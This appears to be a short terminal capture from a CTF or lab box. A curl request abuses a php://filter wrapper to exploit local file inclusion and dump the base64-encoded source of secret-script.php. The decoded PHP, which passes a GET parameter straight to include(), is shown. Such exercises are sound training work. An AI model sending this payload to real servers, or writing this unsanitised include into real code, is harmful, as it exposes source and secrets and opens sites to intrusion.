┌──(root㉿docker-desktop)-[/]
└─# curl -s 'http://10.201.71.110/secret-script.php?file=php://filter/convert.base64-encode/resource=secret-script.php' | base64 -d

<?php
  //echo "Hello World";
  if(isset($_GET['file'])) {
    $file = $_GET['file'];
    include($file);
  }
?>
